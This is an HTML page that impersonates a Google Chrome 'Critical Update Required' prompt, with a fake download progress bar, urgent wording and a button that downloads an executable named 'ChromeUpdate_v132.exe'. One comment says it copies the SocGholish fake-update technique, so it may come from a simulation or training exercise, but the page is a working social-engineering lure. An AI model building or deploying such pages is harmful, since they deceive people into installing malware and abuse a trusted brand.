<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Update Required</title>
<style>
  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    background: #f0f0f0;
    display: flex; align-items: center; justify-content: center;
    height: 100vh; margin: 0;
  }
  .card {
    background: white;
    border-radius: 12px;
    padding: 40px 48px;
    max-width: 480px;
    text-align: center;
    box-shadow: 0 8px 40px rgba(0,0,0,0.12);
  }
  .chrome-logo { font-size: 56px; margin-bottom: 16px; }
  h1 { font-size: 22px; font-weight: 700; color: #202124; margin-bottom: 8px; }
  .version { font-size: 13px; color: #5f6368; margin-bottom: 24px; }
  .update-bar {
    background: #f1f3f4; border-radius: 8px;
    padding: 16px; margin-bottom: 20px; text-align: left;
  }
  .update-label { font-size: 12px; color: #5f6368; margin-bottom: 6px; }
  .progress { height: 4px; background: #e8eaed; border-radius: 2px; overflow: hidden; }
  .progress-fill { height: 100%; background: #4285f4; width: 0%; animation: fill 3s ease-in-out forwards; }
  @keyframes fill { to { width: 100%; } }
  .btn-update {
    background: #4285f4; color: white; border: none;
    padding: 12px 32px; border-radius: 6px; font-size: 15px;
    font-weight: 600; cursor: pointer; width: 100%; margin-bottom: 10px;
  }
  .btn-update:hover { background: #3367d6; }
  .disclaimer { font-size: 11px; color: #9aa0a6; }
</style>
</head>
<body>
<div class="card">
  <div class="chrome-logo">🌐</div>
  <h1>Critical Update Required</h1>
  <p class="version">Google Chrome · Version 131.0.6778.85 is out of date</p>

  <div class="update-bar">
    <div class="update-label">Downloading update...</div>
    <div class="progress"><div class="progress-fill"></div></div>
  </div>

  <!-- The download triggers a file with .exe extension — this is what real SocGholish does -->
  <a href="ChromeUpdate_v132.exe" download>
    <button class="btn-update">Update Chrome Now</button>
  </a>
  <p class="disclaimer">By updating, you agree to Google's Terms of Service. Update is required to continue browsing securely.</p>
</div>
</body>
</html>
